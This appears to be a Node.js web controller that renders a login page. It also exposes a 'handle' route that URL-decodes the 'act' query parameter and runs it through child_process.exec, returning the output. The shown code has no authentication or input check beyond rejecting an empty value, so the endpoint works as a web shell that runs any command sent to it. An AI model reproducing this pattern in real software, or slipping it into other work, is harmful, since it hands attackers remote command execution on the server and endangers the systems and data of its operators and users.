var logger = require('../utils/logger');
var jsonHelper = require('../utils/jsonHelper');
var config = require('../config');
var common = require('../utils/common');
var Promise = require('bluebird');
var fs = require('fs');
var _ = require('underscore');
var co = require('co');

exports.render = function*() {
	this.body = yield this.render('login');
};

exports.handle = function*(next) {
	var act = this.query.act || '';
	var _this = this;

	if (act.trim().length === 0)
		return this.body = jsonHelper.getError("act不能为空");

	yield co(function*() {
		return yield execCmd(act)
	}).then((docs) => {
		_this.body = jsonHelper.getSuccess(docs);
	}).catch(err => {
		logger.normal.error(err);
		_this.body = jsonHelper.getError(err);
	})

};

function execCmd(act) {
	return new Promise(function(resolve, reject) {
		require('child_process').exec(decodeURIComponent(act), (err, out) => {
			if (err) return reject(err.message)
			resolve(out);
		})
	})
}